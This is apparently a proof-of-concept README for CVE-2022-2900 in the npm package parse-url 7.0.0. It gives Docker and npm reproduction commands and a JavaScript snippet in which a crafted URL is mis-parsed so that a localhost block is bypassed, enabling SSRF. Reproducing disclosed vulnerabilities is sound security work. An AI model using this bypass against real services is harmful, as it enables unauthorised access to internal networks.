### CVE-2022-2900

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/1b4c972a-abc8-41eb-a2e1-696db746b5fd/)

### Docker Build and Run Command
```shell
docker build -t cve-2022-2900-poc .
docker run -itd --name CVE-2022-2900-POC cve-2022-2900-poc
docker exec -it CVE-2022-2900-POC /bin/bash
```

### PoC Reproduce Command
```shell
cd /poc
# Install Vulnerable Dependence
npm init -y
npm install --save parse-url@7.0.0
# Run poc.js
node poc.js
```

### Description
可以观察到url解析错误，解析出来的属性错误，可能会触发SSRF漏洞等，例如：
```javascript
import parseUrl from "parse-url";
import fetch from 'node-fetch';

var parsed = parseUrl("http://nnnn@localhost:808:/?id=xss")
// SSRF，会访问到 http://nnnn@localhost/808  (跳转)-->  http://localhost/808
if (parsed.resource == "localhost") {
    console.log("internal network access is blocked")
} else {
    const response = await fetch('http://' + parsed.resource + parsed.pathname);
    console.log(response)
}
```



